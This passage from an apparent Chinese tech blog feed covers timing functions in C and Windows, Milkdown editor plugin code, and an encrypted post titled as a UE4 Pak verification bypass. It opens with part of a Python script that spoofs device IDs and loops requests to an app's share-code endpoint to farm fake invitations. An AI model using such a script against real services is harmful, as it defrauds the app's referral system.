function_">verify</span>(<span class="params">code</span>): </span><br><span class="line">    data = encrypt( json.dumps(&#123; <span class="string">&quot;sourceType&quot;</span>: <span class="string">&quot;novel&quot;</span>, <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;android&quot;</span>, <span class="string">&quot;packageName&quot;</span>: <span class="string">&quot;sanliumanhua.apps.com&quot;</span>, <span class="string">&quot;version&quot;</span>: <span class="string">&quot;9tg.06.07.207&quot;</span>, <span class="string">&quot;channel&quot;</span>: <span class="string">&quot;lb&quot;</span>, <span class="string">&quot;deviceno&quot;</span>: device_no(), <span class="string">&quot;ts&quot;</span>: get_time(), <span class="string">&quot;code&quot;</span>: code &#125;)) </span><br><span class="line">    form = &#123; <span class="string">&quot;data&quot;</span>: data, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;verifycode&quot;</span> &#125; </span><br><span class="line">    headers = &#123; <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;okhttp-okgo/jeasonlzy&quot;</span> &#125; </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;form: &quot;</span>, form)</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://lb.pigqq.com/UserShareAction.aspx&quot;</span>, data=form, headers=headers) </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> response.content: </span><br><span class="line">        <span class="keyword">return</span> response.json() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>): </span><br><span class="line">    response = verify(CODE) </span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;响应为空&quot;</span>) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line">    <span class="keyword">elif</span> response[<span class="string">&quot;data&quot;</span>] == <span class="string">&quot;分享码验证通过&quot;</span>: </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已邀请<span class="subst">&#123;i&#125;</span>个人&quot;</span>) </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="built_in">print</span>(response[<span class="string">&quot;info&quot;</span>]) </span><br><span class="line">        <span class="keyword">break</span> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷邀请 </tag>
            
            <tag> 风车动漫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UE4引擎bypassPak文件校验</title>
      <link href="/f1a554574711/"/>
      <url>/f1a554574711/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="95fb9da539fbc92ed81137639067314498509ade483d0f2a4914d1b2080c619c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAK </tag>
            
            <tag> UE4 </tag>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【转载】时间函数介绍</title>
      <link href="/e772618e3274/"/>
      <url>/e772618e3274/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转自：<a href="https://blog.csdn.net/crzmy/article/details/109537825">https://blog.csdn.net/crzmy/article/details/109537825</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>我们在衡量一个函数的运行时间，或者判断一个算法的时间效率，或者在程序中我们需要一个定时器，定时执行一个特定的操作，都会用到时间函数。编译器和操作系统为我们提供了很多时间函数，这些时间函数的精度也是各不相同。所以，如果我们想得到准确的结果，必须使用合适的时间函数。</p><h2 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h2><p><strong>原理：</strong>Sleep函数是使调用Sleep函数的线程休眠，线程主动放弃时间片。当经过指定的时间间隔后，再启动线程，继续执行代码。Sleep函数并不能起到定时的作用，主要作用是延时。在一些多线程中，可能会看到Sleep(0)，其主要目的是让出时间片。</p><p><strong>精度：</strong>Sleep函数的精度非常低，当系统越忙它精度就越低。它的精度取决于线程自身的优先级、其它线程的优先级，以及线程的数量等因素。</p><h2 id="MFC的timer事件"><a href="#MFC的timer事件" class="headerlink" title="MFC的timer事件"></a>MFC的timer事件</h2><p><strong>原理：</strong>timer是一个定时器，可以指定回调函数，默认是Ontimer()函数。</p><p><strong>精度：</strong>timer事件的精度范围在ms级别，系统越忙其精度越差。</p><h2 id="C语言的Time"><a href="#C语言的Time" class="headerlink" title="C语言的Time"></a>C语言的Time</h2><p><strong>原理：</strong>主要用于获取当前时间。</p><p><strong>精度：</strong>秒级别。</p><h2 id="C语言下的时钟周期clock"><a href="#C语言下的时钟周期clock" class="headerlink" title="C语言下的时钟周期clock"></a>C语言下的时钟周期clock</h2><p><strong>原理：</strong>clock()是获取计算机启动后的时间间隔。</p><p><strong>精度：</strong>ms级别，对于短时间内的定时或者延时可以达到ms级别，对于长时间的定时或者延迟的精度还是不够。</p><h2 id="Windows下的GetTickCount"><a href="#Windows下的GetTickCount" class="headerlink" title="Windows下的GetTickCount"></a>Windows下的GetTickCount</h2><p><strong>原理：</strong>GetTickCount()是获取系统启动后的时间间隔。与clock()一样，是向主板BIOS要real time clock时间，会有中断产生，以及延迟问题。</p><p><strong>精度：</strong>WinowsNT 3.5以及以后版本精度是10ms，它的时间精度比clock要高。</p><h2 id="高精度时控函数QueryPerformanceFrequency"><a href="#高精度时控函数QueryPerformanceFrequency" class="headerlink" title="高精度时控函数QueryPerformanceFrequency"></a>高精度时控函数QueryPerformanceFrequency</h2><p><strong>原理：</strong>CPU上也有一个计数器，以机器人的clock为单位，可以通过rdtsc读取，而不用中断，因此其精度与系统时间相当。</p><p><strong>精度：</strong>计算机获取硬件支持，精度比较高，可以通过它来判断其它时间函数的精度范围。</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> QueryPerformanceCounter </tag>
            
            <tag> QueryPerformanceFrequency </tag>
            
            <tag> 时间函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Milkdown 编辑器使用指南</title>
      <link href="/3457bd16afae/"/>
      <url>/3457bd16afae/</url>
      
        <content type="html"><![CDATA[<p>最近因为写ToDoList软件的时候需要一款MarkDown编辑器，尝试过很多种。都有些不尽人意的地方，后来热心群友推荐了Milkdown这款编辑器，当时一看到界面就被它的颜值吸引到了，在体验到他便捷的语法后当即决定使用这款编辑器。<br>但是使用过程中，并不是很顺畅，文档有些感觉就像是话说了一半的样子，网上的文档也不是很多。所以这里将进行一些使用过程中遇见的问题记录。方便自己帮助他人。</p><p><strong>官方示例：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  createCmdKey,</span><br><span class="line">  <span class="title class_">MilkdownPlugin</span>,</span><br><span class="line">  <span class="title class_">CommandsReady</span>,</span><br><span class="line">  commandsCtx,</span><br><span class="line">  schemaCtx,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/core&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; wrapIn &#125; <span class="keyword">from</span> <span class="string">&quot;prosemirror-commands&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">WrapInBlockquote</span> = <span class="title function_">createCmdKey</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="attr">plugin</span>: <span class="title class_">MilkdownPlugin</span> = <span class="function">() =&gt;</span> <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">  <span class="comment">// wait for command manager ready</span></span><br><span class="line">  <span class="keyword">await</span> ctx.<span class="title function_">wait</span>(<span class="title class_">CommandsReady</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> commandManager = ctx.<span class="title function_">get</span>(commandsCtx);</span><br><span class="line">  <span class="keyword">const</span> schema = ctx.<span class="title function_">get</span>(schemaCtx);</span><br><span class="line"></span><br><span class="line">  commandManager.<span class="title function_">create</span>(<span class="title class_">WrapInBlockquote</span>, <span class="function">() =&gt;</span></span><br><span class="line">    <span class="title function_">wrapIn</span>(schema.<span class="property">nodes</span>.<span class="property">blockquote</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// call command</span></span><br><span class="line">commandManager.<span class="title function_">call</span>(<span class="title class_">WrapInBlockquote</span>);</span><br></pre></td></tr></table></figure><p><strong>我的示例：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  createCmdKey,</span><br><span class="line">  <span class="title class_">MilkdownPlugin</span>,</span><br><span class="line">  <span class="title class_">CommandsReady</span>,</span><br><span class="line">  commandsCtx,</span><br><span class="line">  schemaCtx,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/core&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; wrapIn &#125; <span class="keyword">from</span> <span class="string">&quot;prosemirror-commands&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> taskList = <span class="title function_">createCmdKey</span>(<span class="string">&quot;TaskList&quot;</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">taskListPlugin</span>: <span class="title class_">MilkdownPlugin</span> = <span class="function">() =&gt;</span> <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 等待命令管理器初始化完成</span></span><br><span class="line">  <span class="keyword">await</span> ctx.<span class="title function_">wait</span>(<span class="title class_">CommandsReady</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> commandManager = ctx.<span class="title function_">get</span>(commandsCtx);</span><br><span class="line">  <span class="keyword">const</span> schema = ctx.<span class="title function_">get</span>(schemaCtx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 下方wrapIn(schema.nodes.blockquote)可以修改为自己所期望的行为</span></span><br><span class="line">  commandManager.<span class="title function_">create</span>(taskList, <span class="function">() =&gt;</span> <span class="title function_">wrapIn</span>(schema.<span class="property">nodes</span>.<span class="property">blockquote</span>));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>使用方式：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; editor &#125; = <span class="title function_">useEditor</span>(</span><br><span class="line">  <span class="function">(<span class="params">root</span>) =&gt;</span></span><br><span class="line">    <span class="title class_">Editor</span>.<span class="title function_">make</span>()</span><br><span class="line">      .<span class="title function_">config</span>(<span class="function">(<span class="params">ctx</span>) =&gt;</span> &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(rootCtx, root);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">use</span>(taskListPlugin) <span class="comment">// 你导出的插件名</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>该功能主要是自定义 markdown 中元素的样式，比如超链接的样子。唯一的坑点就是你引入<code>@milkdown/preset-gfm</code>这个包后，会和官方示例冲突，所以使用官方示例的时候需要注释掉<code>@milkdown/preset-gfm</code>这个插件的使用。即可解决冲突问题。</p><p><strong>官方的解释：</strong><a href="https://github.com/Saul-Mirone/milkdown/issues/294">https://github.com/Saul-Mirone/milkdown/issues/294</a></p><p><strong>官方示例：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  slashPlugin,</span><br><span class="line">  slash,</span><br><span class="line">  createDropdownItem,</span><br><span class="line">  defaultActions,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/plugin-slash&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; themeManagerCtx, commandsCtx &#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/core&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Editor</span>.<span class="title function_">make</span>().<span class="title function_">use</span>(</span><br><span class="line">  slash.<span class="title function_">configure</span>(slashPlugin, &#123;</span><br><span class="line">    <span class="attr">config</span>: <span class="function">(<span class="params">ctx</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// Get default slash plugin items</span></span><br><span class="line">      <span class="keyword">const</span> actions = <span class="title function_">defaultActions</span>(ctx);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Define a status builder</span></span><br><span class="line">      <span class="keyword">return</span> <span class="function">(<span class="params">&#123; isTopLevel, content, parentNode &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// You can only show something at root level</span></span><br><span class="line">        <span class="keyword">if</span> (!isTopLevel) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Empty content ? Set your custom empty placeholder !</span></span><br><span class="line">        <span class="keyword">if</span> (!content) &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123; <span class="attr">placeholder</span>: <span class="string">&quot;Type / to use the slash commands...&quot;</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Define the placeholder &amp; actions (dropdown items) you want to display depending on content</span></span><br><span class="line">        <span class="keyword">if</span> (content.<span class="title function_">startsWith</span>(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">          <span class="comment">// Add some actions depending on your content&#x27;s parent node</span></span><br><span class="line">          <span class="keyword">if</span> (parentNode.<span class="property">type</span>.<span class="property">name</span> === <span class="string">&quot;customNode&quot;</span>) &#123;</span><br><span class="line">            actions.<span class="title function_">push</span>(&#123;</span><br><span class="line">              <span class="attr">id</span>: <span class="string">&quot;custom&quot;</span>,</span><br><span class="line">              <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;Custom&quot;</span>, <span class="string">&quot;h1&quot;</span>),</span><br><span class="line">              <span class="attr">command</span>: <span class="function">() =&gt;</span></span><br><span class="line">                ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="comment">/* Add custom command here */</span>),</span><br><span class="line">              <span class="attr">keyword</span>: [<span class="string">&quot;custom&quot;</span>],</span><br><span class="line">              <span class="attr">typeName</span>: <span class="string">&quot;heading&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> content === <span class="string">&quot;/&quot;</span></span><br><span class="line">            ? &#123;</span><br><span class="line">                <span class="attr">placeholder</span>: <span class="string">&quot;Type to filter...&quot;</span>,</span><br><span class="line">                actions,</span><br><span class="line">              &#125;</span><br><span class="line">            : &#123;</span><br><span class="line">                <span class="attr">actions</span>: actions.<span class="title function_">filter</span>(<span class="function">(<span class="params">&#123; keyword &#125;</span>) =&gt;</span></span><br><span class="line">                  keyword.<span class="title function_">some</span>(<span class="function">(<span class="params">key</span>) =&gt;</span></span><br><span class="line">                    key.<span class="title function_">includes</span>(content.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">toLocaleLowerCase</span>())</span><br><span class="line">                  )</span><br><span class="line">                ),</span><br><span class="line">              &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>我的示例：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; commandsCtx, <span class="title class_">Ctx</span>, schemaCtx, themeManagerCtx &#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/core&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  createDropdownItem,</span><br><span class="line">  slash,</span><br><span class="line">  slashPlugin,</span><br><span class="line">  <span class="title class_">WrappedAction</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;@milkdown/plugin-slash&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义下拉菜单</span></span><br><span class="line"><span class="keyword">const</span> diyActions = (<span class="attr">ctx</span>: <span class="title class_">Ctx</span>, input = <span class="string">&quot;/&quot;</span>): <span class="title class_">WrappedAction</span>[] =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; nodes &#125; = ctx.<span class="title function_">get</span>(schemaCtx);</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">actions</span>: <span class="title class_">Array</span>&lt;</span><br><span class="line">    <span class="title class_">WrappedAction</span> &amp; &#123; <span class="attr">keyword</span>: string[]; <span class="attr">typeName</span>: string &#125;</span><br><span class="line">  &gt; = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;h1&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;标签一&quot;</span>, <span class="string">&quot;h1&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TurnIntoHeading&quot;</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;h1&quot;</span>, <span class="string">&quot;large heading&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;heading&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;h2&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;标签二&quot;</span>, <span class="string">&quot;h2&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TurnIntoHeading&quot;</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;h2&quot;</span>, <span class="string">&quot;medium heading&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;heading&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;h3&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;标签三&quot;</span>, <span class="string">&quot;h3&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TurnIntoHeading&quot;</span>, <span class="number">3</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;h3&quot;</span>, <span class="string">&quot;small heading&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;heading&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;bulletList&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(</span><br><span class="line">        ctx.<span class="title function_">get</span>(themeManagerCtx),</span><br><span class="line">        <span class="string">&quot;无序列表&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bulletList&quot;</span></span><br><span class="line">      ),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;WrapInBulletList&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;bullet list&quot;</span>, <span class="string">&quot;ul&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;bullet_list&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;orderedList&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(</span><br><span class="line">        ctx.<span class="title function_">get</span>(themeManagerCtx),</span><br><span class="line">        <span class="string">&quot;有序列表&quot;</span>,</span><br><span class="line">        <span class="string">&quot;orderedList&quot;</span></span><br><span class="line">      ),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;WrapInOrderedList&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;ordered list&quot;</span>, <span class="string">&quot;ol&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;ordered_list&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;taskList&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;任务列表&quot;</span>, <span class="string">&quot;taskList&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TurnIntoTaskList&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;task list&quot;</span>, <span class="string">&quot;task&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;task_list_item&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;image&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;图片&quot;</span>, <span class="string">&quot;image&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;InsertImage&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;image&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;image&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;blockquote&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;引用&quot;</span>, <span class="string">&quot;quote&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;WrapInBlockquote&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;quote&quot;</span>, <span class="string">&quot;blockquote&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span 